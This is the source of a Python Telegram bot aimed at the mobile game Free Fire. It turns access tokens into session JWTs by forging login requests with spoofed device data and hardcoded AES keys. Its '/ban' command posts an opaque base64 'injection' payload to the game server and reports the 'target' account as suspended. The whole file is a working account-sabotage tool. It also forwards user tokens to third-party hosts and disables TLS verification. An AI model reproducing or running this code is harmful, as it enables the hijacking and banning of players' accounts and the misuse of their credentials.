import os
import sys
import json
import base64
import requests
import urllib3
import urllib.parse
from datetime import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler

urllib3.disable_warnings()

# Protobuf and Crypto imports
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    sys.exit(1)

try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError:
    sys.exit(1)

BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV  = b'6oyZDr22E3ychjM%'
mLuRl  = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr  = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB54"
}

def decode_ff_name(b64_str):
    try:
        if not b64_str: return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        name = decrypted_bytes.decode('utf-8', errors='ignore')
        return name if name else "Unknown"
    except Exception:
        return "Unknown"

def enc(d): 
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d): 
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def build_majorlogin(tok, open_id, p_type):
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def fetch_majorlogin_jwt(tok):
    if tok.startswith("ey") and "." in tok:
        return tok, None

    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={tok}", headers={"User-Agent": "Mozilla/5.0"}, timeout=5).json()
        oId = r.get("open_id")
    except: pass

    if not oId:
        try:
            uid_headers = {"access-token": tok, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", headers=uid_headers, verify=False, timeout=5).json()
            uid = uid_res.get("uid")
            if uid:
                openid_res = requests.post("https://topup.pk/api/auth/player_id_login", headers={"Content-Type": "application/json"}, json={"app_id": 100067, "login_id": str(uid)}, verify=False, timeout=5).json()
                oId = openid_res.get("open_id")
        except: pass

    if not oId:
        return None, "Failed to extract Open ID. Token is invalid or expired."

    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(tok, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                res = mLrPb.MajorLoginRes()
                try:    
                    res.ParseFromString(dec(x.content))
                except: 
                    res.ParseFromString(x.content)
                if res.token:
                    return res.token, None 
        except:
            continue
            
    return None, "MajorLogin failed. Account might be blocked or platform mismatch."

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        decoded_str = decoded_bytes.decode('utf-8')
        return json.loads(decoded_str)
    except Exception:
        return {}

def get_base_url(lock_region):
    lock_region = lock_region.upper()
    if lock_region in ["IND"]:
        return "https://client.ind.freefiremobile.com"
    elif lock_region in ["BR", "US", "NA", "SAC"]:
        return "https://client.us.freefiremobile.com"
    else:
        return "https://clientbp.ggpolarbear.com"

def trigger_injection(jwt_token, version, base_url):
    api_url = f"{base_url}/GetLoginData"
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(api_url, headers=headers, data=body, timeout=20, verify=False)

# Telegram Command Handlers
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👑 *FF BOT SERVICES* 👑\n\n"
        "1️⃣ *Convert EAT to Access Token:* `/eat <eat_token>`\n"
        "2️⃣ *Execute Ban Script:* `/ban <access_token>`",
        parse_mode="Markdown"
    )

async def eat_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("⚠️ Please provide your EAT Token!\nUsage: `/eat <eat_token>`", parse_mode="Markdown")
        return

    eat_token = context.args[0].strip()
    msg = await update.message.reply_text("⏳ Converting EAT Token to Access Token...")

    api_url = f"https://eat-to-access-beta.vercel.app/eat_to_access?eat_token={eat_token}"
    try:
        response = requests.get(api_url, timeout=15)
        data = response.json()
        if data.get("status") == "success" and "access_token" in data:
            acc_token = data.get("access_token")
            region = data.get("region", "N/A")
            game_uid = data.get("game_uid", "N/A")
            nickname = data.get("nickname", "N/A")

            res_msg = (
                "✅ *EAT TO ACCESS SUCCESSFUL* ✅\n\n"
                f"👤 *Nickname:* `{nickname}`\n"
                f"🆔 *UID:* `{game_uid}`\n"
                f"🌍 *Region:* `{region}`\n\n"
                f"🔑 *Access Token:*\n`{acc_token}`\n\n"
                f"💡 *To Ban:* `/ban {acc_token}`"
            )
            await msg.edit_text(res_msg, parse_mode="Markdown")
        else:
            await msg.edit_text(f"❌ *Failed to get Access Token:* {data.get('message', 'Invalid Token or API Error')}")
    except Exception as e:
        await msg.edit_text(f"❌ *System Error:* {str(e)}")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("⚠️ Please provide your Access Token or JWT!\nUsage: `/ban <access_token>`", parse_mode="Markdown")
        return

    access_token = context.args[0].strip()
    msg = await update.message.reply_text("⏳ Authenticating and processing request...")

    try:
        jwt_token, error_msg = fetch_majorlogin_jwt(access_token)
        if not jwt_token:
            await msg.edit_text(f"❌ *Authentication Failed:* {error_msg}", parse_mode="Markdown")
            return

        user_data = decode_jwt(jwt_token)
        raw_nick = user_data.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        region = user_data.get('lock_region', user_data.get('region', 'IND'))
        account_id = user_data.get('account_id', 'Unknown')
        version = user_data.get('release_version', 'Latest')

        base_url = get_base_url(region)
        ban_resp = trigger_injection(jwt_token, version, base_url)

        if ban_resp.status_code == 200:
            response_text = (
                "✅ *ACCOUNT DATA INJECTED SUCCESSFULLY* ✅\n\n"
                f"👤 *Target Name:* {nickname}\n"
                f"🆔 *Target UID:* {account_id}\n"
                f"🌍 *Region:* {region}\n"
                f"📦 *Patch Ver:* {version}\n"
                "🛑 *Status:* SUSPENDED (100%)"
            )
            await msg.edit_text(response_text, parse_mode="Markdown")
        else:
            await msg.edit_text(f"❌ Failed to execute payload! Server returned status: {ban_resp.status_code}")

    except Exception as e:
        await msg.edit_text(f"❌ System Error occurred: {str(e)}")

def main():
    bot_token = os.getenv("BOT_TOKEN")
    if not bot_token:
        print("Error: BOT_TOKEN environment variable is missing!")
        sys.exit(1)

    app = ApplicationBuilder().token(bot_token).build()

    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("eat", eat_command))
    app.add_handler(CommandHandler("ban", ban_command))

    print("Telegram Bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
